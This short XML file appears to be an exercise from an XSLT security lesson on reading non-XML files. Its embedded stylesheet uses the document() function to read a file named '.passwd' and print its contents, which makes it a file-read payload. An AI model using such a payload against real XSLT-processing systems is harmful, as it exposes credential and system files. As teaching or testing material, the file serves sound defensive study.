<?xml-stylesheet type="text/xsl" href="2-9-Reading_Non-XML-Files.xsl"?>
<file>.passwd</file>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:template match="/">
 <xsl:value-of select="document(file)"/>
 </xsl:template>
</xsl:stylesheet>
